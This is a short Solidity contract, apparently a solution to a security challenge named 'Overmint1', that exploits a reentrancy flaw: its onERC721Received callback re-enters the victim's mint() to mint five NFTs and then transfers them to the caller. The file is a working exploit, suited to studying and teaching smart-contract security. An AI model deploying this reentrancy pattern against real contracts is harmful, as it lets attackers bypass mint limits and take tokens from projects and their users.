// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../Overmint1.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1Attacker {
    Overmint1 public victimContract;
    uint recursionCount = 0;
    constructor(address _victimContract) {
        victimContract = Overmint1(_victimContract);
    }

    function attack() external {
        victimContract.mint();
        for (uint i = 1; i < 6; i++) {
            victimContract.safeTransferFrom(address(this), msg.sender, i);
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        recursionCount++;
        if (recursionCount >= 5) {
            return IERC721Receiver.onERC721Received.selector;
        }
        victimContract.mint();

        return IERC721Receiver.onERC721Received.selector;
    }
}
